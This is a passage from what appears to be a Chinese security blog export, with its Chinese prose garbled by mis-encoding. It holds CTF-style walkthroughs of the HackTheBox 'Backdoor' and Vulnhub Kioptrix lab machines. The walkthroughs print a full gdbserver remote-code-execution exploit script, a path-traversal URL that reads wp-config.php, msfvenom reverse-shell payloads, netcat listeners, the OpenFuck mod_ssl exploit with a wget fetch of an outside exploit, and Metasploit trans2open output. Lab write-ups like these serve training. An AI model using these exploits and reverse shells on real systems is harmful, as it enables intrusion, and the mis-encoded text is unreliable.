è¿™è¾¹æ‰«æåå¹¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤šæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ’ä»¶å’Œä¸»é¢˜éƒ½æ²¡æ‰«æå‡ºæ¥ï¼Œä½†çŸ¥é“äº†ç®¡ç†å‘˜ç”¨æˆ·ä¸ºadmin â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit WordPress 5.8.1 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities | php/webapps/39553.txt WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection | php/webapps/44943.txt WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection | php/webapps/48918.sh ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results æœç´¢åä¹Ÿå‘ç°ç¡®å®å­˜åœ¨ä¸‰ä¸ªæ¼æ´ï¼Œä½†éƒ½æ˜¯æ’ä»¶æ¼æ´ï¼Œæš‚æ—¶æ— æ³•ç¡®å®šæ˜¯å¦å­˜åœ¨è¿™äº›æ’ä»¶ï¼Œå’±ä»¬å…ˆå» çœ‹çœ‹ç½‘ç«™å†…å®¹ ç‚¹å‡»Homeä»¥åè·³è½¬åˆ°http://backdoor.htb/ç„¶åæç¤ºå’±ä»¬æ— æ³•è®¿é—®ï¼ŒæŠŠbackdoor.htbåŠ å…¥hostsé‡Œå†è®¿é—® åŠ å…¥åç®€å•çœ‹äº†ä¸€ä¸‹ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œå’±ä»¬æ‰«æä¸€ä¸‹è·¯å¾„çœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 50 -u http://backdoor.htb/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://backdoor.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/11/21 21:15:59 Starting gobuster in directory enumeration mode =============================================================== http://backdoor.htb/wp-content (Status: 301) [Size: 317] [--&gt; http://backdoor.htb/wp-content/] http://backdoor.htb/wp-includes (Status: 301) [Size: 318] [--&gt; http://backdoor.htb/wp-includes/] http://backdoor.htb/wp-admin (Status: 301) [Size: 315] [--&gt; http://backdoor.htb/wp-admin/] http://backdoor.htb/server-status (Status: 403) [Size: 277] =============================================================== 2021/11/21 21:47:17 Finished =============================================================== æ¼æ´åˆ©ç”¨è¿˜æ˜¯æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæœ‰ç‚¹éš¾æå•Šï¼Œåªèƒ½æ‰‹åŠ¨å»è®¿é—®äº†ï¼Œé¦–å…ˆå…ˆå»contentçœ‹çœ‹å§ è®¿é—®contentåæ˜¯ç©ºç™½é¡µé¢ï¼Œç„¶åæ¥ç€æ ¹æ®ç»éªŒè¿›è¡Œæ‰‹åŠ¨è®¿é—®ï¼ˆç”±äºæˆ‘ä½¿ç”¨çš„æ˜¯æµé‡åœ¨è¿›è¡Œæ¸—é€ï¼Œç»§ç»­çˆ†ç ´å·¥ä½œé‡æ¯”è¾ƒå¤§ï¼Œåªèƒ½æ ¹æ®ç»éªŒè¿›è¡Œåˆ¤æ–­äº†ï¼‰ http://backdoor.htb/wp-content/plugins/åœ¨è¯¥è·¯å¾„ä¸‹æœ‰å†…å®¹äº†ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªç›®å½•éå†æ¼æ´ ebook-downloadåº”å½“æ˜¯ä¸€ä¸ªwordpressçš„æ’ä»¶ï¼Œè¿›å»çœ‹ä¸€ä¸‹ æœ‰å†…å®¹çš„åªæœ‰readme.txt è¿›å»çœ‹ä¸€ä¸‹ ç¡®è®¤æ˜¯ä¸€ä¸ªæ’ä»¶ï¼Œå’±ä»¬å»exploit-dbæœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰æ¼æ´ https://www.exploit-db.com/exploits/39575 è¿˜çœŸè®©æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªæ¼æ´ http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php è¿™æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½çš„æ¼æ´ï¼Œä¸‹è½½ä¸€ä¸ªé…ç½®æ–‡ä»¶çœ‹ä¸€ä¸‹ ç¡®è®¤æ¼æ´å­˜åœ¨ä¸”å¯è¢«åˆ©ç”¨ï¼Œæ‹¿ç€å¯¹æ•°æ®åº“å¯†ç å»å°è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ç™»å½•adminç”¨æˆ· å¥½å§çœ‹æ¥æ˜¯æˆ‘å¹´è½»äº†ï¼Œæ˜¯æ— æ³•ç›´æ¥åˆ©ç”¨çš„ï¼Œå’±ä»¬è¿˜å¾—æƒ³åŠæ³•è¿›å…¥æ•°æ®åº“ çªç„¶æ¥äº†çµæ„Ÿï¼Œæˆ–è®¸çªç ´å£åœ¨æ— æ³•è¯»å–åˆ°ä»»ä½•ä¿¡æ¯çš„1337ç«¯å£ä¸Šå‘¢ï¼Ÿä½†æ˜¯æˆ‘ä»¬æ— æ³•è¯»å–1337ç«¯å£ï¼Œæ€ä¹ˆçŸ¥é“å®ƒæ˜¯ä»€ä¹ˆæœåŠ¡å‘¢ï¼Ÿ æœ‰åŠæ³• ä½¿ç”¨Wordpressæ’ä»¶çš„LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰æ¥è¿›è¡Œç«¯å£è¯»å–ï¼Œå’±è¯´å¹²å°±å¹² åƒè¿™æ ·è¯»å–&#x2F;proc&#x2F;pid&#x2F;cmdlineæ–‡ä»¶å°±å¯ä»¥äº†ï¼Œå…¶ä¸­pidæ˜¯å¯å˜æ•°å­—ï¼Œæ ¹æ®æµ‹è¯•æ•°å­—èŒƒå›´åº”è¯¥åœ¨900-1000ä¹‹é—´ æ‰€ä»¥æˆ‘ä»¬åƒè¿™æ ·è®¾ç½®å¥½å°±å¯ä»¥å¼€å§‹çˆ†ç ´äº† æœ‰äº†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªgdbserverçš„æœåŠ¡ï¼Œç»è¿‡æµ‹è¯•è¯¥æœåŠ¡æ˜¯æ¶è®¾åœ¨1337ç«¯å£ä¸Šçš„ï¼Œå¯ä»¥è¿›è¡Œåˆ©ç”¨ åŒæ—¶è¿˜å‘ç°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ ç§ç§ï¼Œè¿™è¿˜æ²¡getshellå‘¢ï¼Œå·²ç»æŠŠrootçš„ä¸œè¥¿éƒ½æåˆ°äº†ï¼Œä¹Ÿæ˜¯æ²¡è°äº† https://www.exploit-db.com/exploits/50539 è¿™é‡Œæ‰¾åˆ°äº†ä¸€ç¯‡gdbserver rceçš„exploitï¼Œå¼€å¹² é¦–å…ˆå°†exploitä¿å­˜åˆ°æœ¬åœ° Step 1# Exploit Title: GNU gdbserver 9.2 - Remote Command Execution (RCE) # Date: 2021-11-21 # Exploit Author: Roberto Gesteira MiÃ±arro (7Rocky) # Vendor Homepage: https://www.gnu.org/software/gdb/ # Software Link: https://www.gnu.org/software/gdb/download/ # Version: GNU gdbserver (Ubuntu 9.2-0ubuntu1~20.04) 9.2 # Tested on: Ubuntu Linux (gdbserver debugging x64 and x86 binaries) #!/usr/bin/env python3 import binascii import socket import struct import sys help = f&#39;&#39;&#39; Usage: python3 {sys.argv[0]} &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt; Example: - Victim&#39;s gdbserver -&gt; 10.10.10.200:1337 - Attacker&#39;s listener -&gt; 10.10.10.100:4444 1. Generate shellcode with msfvenom: $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin 2. Listen with Netcat: $ nc -nlvp 4444 3. Run the exploit: $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin &#39;&#39;&#39; def checksum(s: str) -&gt; str: res = sum(map(ord, s)) % 256 return f&#39;{res:2x}&#39; def ack(sock): sock.send(b&#39;+&#39;) def send(sock, s: str) -&gt; str: sock.send(f&#39;${s}#{checksum(s)}&#39;.encode()) res = sock.recv(1024) ack(sock) return res.decode() def exploit(sock, payload: str): send(sock, &#39;qSupported:multiprocess+;qRelocInsn+;qvCont+;&#39;) send(sock, &#39;!&#39;) try: res = send(sock, &#39;vCont;s&#39;) data = res.split(&#39;;&#39;)[2] arch, pc = data.split(&#39;:&#39;) except Exception: print(&#39;[!] ERROR: Unexpected response. Try again later&#39;) exit(1) if arch == &#39;10&#39;: print(&#39;[+] Found x64 arch&#39;) pc = binascii.unhexlify(pc[:pc.index(&#39;0*&#39;)]) pc += b&#39;\\0&#39; * (8 - len(pc)) addr = hex(struct.unpack(&#39;&lt;Q&#39;, pc)[0])[2:] addr = &#39;0&#39; * (16 - len(addr)) + addr elif arch == &#39;08&#39;: print(&#39;[+] Found x86 arch&#39;) pc = binascii.unhexlify(pc) pc += b&#39;\\0&#39; * (4 - len(pc)) addr = hex(struct.unpack(&#39;&lt;I&#39;, pc)[0])[2:] addr = &#39;0&#39; * (8 - len(addr)) + addr hex_length = hex(len(payload))[2:] print(&#39;[+] Sending payload&#39;) send(sock, f&#39;M{addr},{hex_length}:{payload}&#39;) send(sock, &#39;vCont;c&#39;) def main(): if len(sys.argv) &lt; 3: print(help) exit(1) ip, port = sys.argv[1].split(&#39;:&#39;) file = sys.argv[2] try: with open(file, &#39;rb&#39;) as f: payload = f.read().hex() except FileNotFoundError: print(f&#39;[!] ERROR: File {file} not found&#39;) exit(1) with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: sock.connect((ip, int(port))) print(&#39;[+] Connected to target. Preparing exploit&#39;) exploit(sock, payload) print(&#39;[*] Pwned!! Check your listener&#39;) if __name__ == &#39;__main__&#39;: main() Step 2ç„¶åä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªæœ¨é©¬ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 PrependFork=true -o rev.bin Step 3ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªæœ¬åœ°ç«¯å£ nc -nvlp 4444 Step 4æ‰§è¡ŒExploit â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 exploit.py 10.10.11.125:1337 rev.bin 1 â¨¯ [+] Connected to target. Preparing exploit [+] Found x64 arch [+] Sending payload [*] Pwned!! Check your listener ç„¶åæˆåŠŸå¼¹å›ä¸€ä¸ªshell â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.23] from (UNKNOWN) [10.10.11.125] 50626 whoami&amp;&amp;id user uid=1000(user) gid=1000(user) groups=1000(user) ä½¿ç”¨python3è·å–ä¸€ä¸ªäº¤äº’å¼shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; user@Backdoor:/home/user$ user@Backdoor:/home/user$ ls ls user.txt user@Backdoor:/home/user$ cat user.txt cat user.txt 10ba3c92228d369cea03eec58f58420c æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag æƒé™æå‡è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„screenå—ï¼Ÿè¿™å°±æ˜¯ææƒçš„å…³é”®ï¼Œææƒåªéœ€è¦ä¸¤å¥ export TERM=xterm screen -x root/root ç„¶åå³å¯è¿›å…¥rootæƒé™ root@Backdoor:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ°rootæƒé™ root@Backdoor:~# ls ls root.txt root@Backdoor:~# cat root.txt cat root.txt 692be0661cb8d3c7cdf05379c93b9e8c æˆåŠŸæ‹¿åˆ°rootç”¨æˆ·çš„flagæƒé™","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Kioptrix Level 1 - Vulnhub","slug":"Vulnhub  - Kioptrix","date":"2021-11-13T00:36:20.000Z","updated":"2023-05-19T10:37:26.000Z","comments":true,"path":"2021/11/13/Vulnhub  - Kioptrix/","link":"","permalink":"http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/","excerpt":"","text":"é¶åœºä¿¡æ¯This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. è¿™ä¸ªKioptrix VM Imageæ˜¯å¾ˆå®¹æ˜“çš„æŒ‘æˆ˜ã€‚æ¸¸æˆçš„ç›®çš„æ˜¯é€šè¿‡ä»»ä½•å¯èƒ½çš„æ‰‹æ®µè·å¾—rootæƒé™ï¼ˆé™¤äº†å®é™…å…¥ä¾µVMæœåŠ¡å™¨æˆ–ç©å®¶ï¼‰ã€‚è¿™äº›æ¸¸æˆçš„ç›®çš„æ˜¯å­¦ä¹ æ¼æ´è¯„ä¼°å’Œåˆ©ç”¨æ–¹é¢çš„åŸºæœ¬å·¥å…·å’ŒæŠ€æœ¯ã€‚æˆåŠŸå®Œæˆè¿™äº›æŒ‘æˆ˜çš„æ–¹æ³•æœ‰å¾ˆå¤šã€‚ ä¸‹è½½åœ°å€ https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨arpè·å–é¶æœºçš„IPåœ°å€ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.1.102 00:0c:29:55:cb:15 VMware, Inc. 9 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded ç¡®å®šé¶æœºIPåœ°å€ä¸º192.168.1.102ï¼Œä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST Nmap scan report for 192.168.1.102 Host is up (0.00042s latency). Not shown: 65529 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) | ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) | 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) |_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: Test Page for the Apache Web Server on Red Hat Linux 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 1024/tcp status |_ 100024 1 1024/udp status 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 |_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 |_ SSL2_DES_64_CBC_WITH_MD5 1024/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:55:CB:15 (VMware) Device type: general purpose Running: Linux 2.4.X OS CPE: cpe:/o:linux:linux_kernel:2.4 OS details: Linux 2.4.9 - 2.4.18 (likely embedded) Network Distance: 1 hop Host script results: |_clock-skew: 1h01m54s |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) |_smb2-time: Protocol negotiation failed (SMB2) TRACEROUTE HOP RTT ADDRESS 1 0.42 ms 192.168.1.102 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds è¿™ä¸œè¥¿ç¨å¾®çš„æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸ªçœ‹ 80ç«¯å£å¥½åƒä¹Ÿæ²¡å•¥å¯çœ‹çš„ï¼Ÿæ‰«ä¸ªç›®å½•çœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.1.102/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/11/12 07:52:42 Starting gobuster in directory enumeration mode =============================================================== http://192.168.1.102/.htaccess (Status: 403) [Size: 273] http://192.168.1.102/.htpasswd (Status: 403) [Size: 273] http://192.168.1.102/.hta (Status: 403) [Size: 268] http://192.168.1.102/.htaccess.php (Status: 403) [Size: 277] http://192.168.1.102/.htpasswd.php (Status: 403) [Size: 277] http://192.168.1.102/.hta.php (Status: 403) [Size: 272] http://192.168.1.102/~root (Status: 403) [Size: 269] http://192.168.1.102/~operator (Status: 403) [Size: 273] http://192.168.1.102/cgi-bin/ (Status: 403) [Size: 272] http://192.168.1.102/index.html (Status: 200) [Size: 2890] http://192.168.1.102/manual (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/] http://192.168.1.102/mrtg (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/] http://192.168.1.102/usage (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/] http://192.168.1.102/test.php (Status: 200) [Size: 27] æŒ¨ä¸ªå»çœ‹çœ‹ å‡ ä¸ªé¡µé¢éƒ½ä¼šè·³è½¬åˆ°127.0.0.1ï¼Œåªæœ‰test.phpå¯ä»¥è®¿é—®ï¼Œè€Œä¸”è¿˜æ²¡ä»€ä¹ˆä¸œè¥¿ ç»§ç»­å›åˆ°ç«¯å£çœ‹çœ‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# smbclient -L 192.168.1.102 1 â¨¯ protocol negotiation failed: NT_STATUS_IO_TIMEOUT æ¼æ´åˆ©ç”¨çœ‹åˆ°80ç«¯å£åé¢çš„mod_ssl&#x2F;2.8.4ï¼Œå»æœä¸€ä¸‹æœ‰æ²¡æœ‰Exploit â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit mod_ssl ------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------ --------------------------------- Apache mod_ssl 2.0.x - Remote Denial of Service | linux/dos/24590.txt Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow | multiple/dos/21575.txt Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow | unix/remote/21671.c Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1) | unix/remote/764.c Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2) | unix/remote/47080.c Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow | unix/remote/40347.txt ------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results å¯¹æ¯”mod_ssl&#x2F;2.8.4ç‰ˆæœ¬ï¼Œæœ‰ä¸‰ä¸ªç‰ˆæœ¬åˆé€‚ï¼ŒæŒ¨ä¸ªè¿›è¡Œæµ‹è¯• ç»è¿‡æµ‹è¯•å‘ç°unix&#x2F;remote&#x2F;47080.cæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# locate unix/remote/47080.c /usr/share/exploitdb/exploits/unix/remote/47080.c â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./ ç„¶åä½¿ç”¨gccè¿›è¡Œç¼–è¯‘ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gcc -o exploit 47080.c -lcrypto 47080.c:21:10: fatal error: openssl/ssl.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½• 21 | #include &lt;openssl/ssl.h&gt; | ^~~~~~~~~~~~~~~ compilation terminated. æç¤ºæŠ¥é”™äº†ï¼Œç»è¿‡ç™¾åº¦æœç´¢ï¼Œå‘ç°æ˜¯ç¼ºå°‘äº†ç»„ä»¶ å’±ä»¬ä½¿ç”¨aptè¿›è¡Œå®‰è£… â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# apt-get install libssl1.0-dev ç„¶åå†è¿›è¡Œç¼–è¯‘ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gcc -o exploit 47080.c -lcrypto â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ls 47080.c exploit å»è¿è¡Œä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./exploit target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) è¿è¡Œåå¾—åˆ°äº†è¿è¡Œå‚æ•°ï¼Œå’±ä»¬è¿˜å¾—å…ˆæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit | grep apache-1.3.20 1 â¨¯ 0x02 - Cobalt Sun 6.0 (apache-1.3.20) 0x27 - FreeBSD (apache-1.3.20) 0x28 - FreeBSD (apache-1.3.20) 0x29 - FreeBSD (apache-1.3.20+2.8.4) 0x2a - FreeBSD (apache-1.3.20_1) 0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk) 0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk) 0x3f - Mandrake Linux 8.1 (apache-1.3.20-3) 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 0x7e - Slackware Linux 8.0 (apache-1.3.20) 0x86 - SuSE Linux 7.3 (apache-1.3.20) ç¬¦åˆæ¡ä»¶çš„æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯0x6aå’Œ0x6bï¼Œåˆ†åˆ«å»æµ‹è¯•ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit 0x6a 192.168.1.102 -c 40 ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8070 Ready to send shellcode Spawning shell... Good Bye! 0x6aæµ‹è¯•å¤±è´¥ï¼Œç°åœ¨å»æµ‹è¯•ä¸€ä¸‹0x6b â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ./exploit 0x6b 192.168.1.102 -c 40 ******************************************************************* * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f81e8 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo --09:32:52-- https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c =&gt; `ptrace-kmod.c&#39; Connecting to dl.packetstormsecurity.net:443... connected! Unable to establish SSL connection. Unable to establish SSL connection. gcc: ptrace-kmod.c: No such file or directory gcc: No input files rm: cannot remove `ptrace-kmod.c&#39;: No such file or directory bash: ./exploit: No such file or directory bash-2.05$ bash-2.05$ whoami&amp;&amp;id whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) 0x6bæˆåŠŸgetshellï¼Œç°åœ¨å»ææƒ æƒé™æå‡ç»è¿‡æµ‹è¯•åæ²¡æœ‰å‘ç°ææƒçš„ç‚¹ï¼Œä½†æ˜¯å‘ç°äº†å¦ä¸€ç§rootæƒé™çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ç”¨msfçš„æ¨¡å— use exploit/linux/samba/trans2open set payload linux/x86/shell_reverse_tcp show options set rhosts 192.168.1.102 exploit msf6 exploit(linux/samba/trans2open) &gt; exploit [*] Started reverse TCP handler on 192.168.1.106:4444 [*] 192.168.1.102:139 - Trying return address 0xbffffdfc... [*] 192.168.1.102:139 - Trying return address 0xbffffcfc... [*] 192.168.1.102:139 - Trying return address 0xbffffbfc... [*] 192.168.1.102:139 - Trying return address 0xbffffafc... [*] 192.168.1.102:139 - Trying return address 0xbffff9fc... [*] 192.168.1.102:139 - Trying return address 0xbffff8fc... [*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500 [*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500 [*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500 whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=99(nobody) ç”¨msfçš„æ¨¡å—æ‰“å°±æ˜¯rootï¼Œè‡³äºä¸ºå•¥æˆ‘ä¹Ÿæ²¡ç ”ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶æ¥ï¼ˆä¸»è¦å› ä¸ºèœï¼‰ çŸ¥é“åŸå› çš„å°ä¼™ä¼´å¯ä»¥å‘Šè¯‰æˆ‘ä¸€ä¸‹","categories":[],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]},{"title":"Chill_Hack - Vulnhub","slug":"Vulnhub  - Chill_Hack","date":"2021-10-17T08:31:38.000Z","updated":"2023-05-19T10:37:17.000Z","comments":true,"path":"2021/10/17/Vulnhub  - Chill_Hack/","link":"","permalink":"http://www.lucifiel.com/2021/10/17/Vulnhub%20%20-%20Chill_Hack/","excerpt":"","text":"Vulnhub-Chill_Hacké¶åœºå®æˆ˜ Vulnhub-Chill_Hack é¶åœºä¸‹è½½åœ°å€https://www.vulnhub.com/entry/chill-hack-1,622/ åºŸè¯ä¸å¤šè¯´ ç›´æ¥å¼€å§‹ 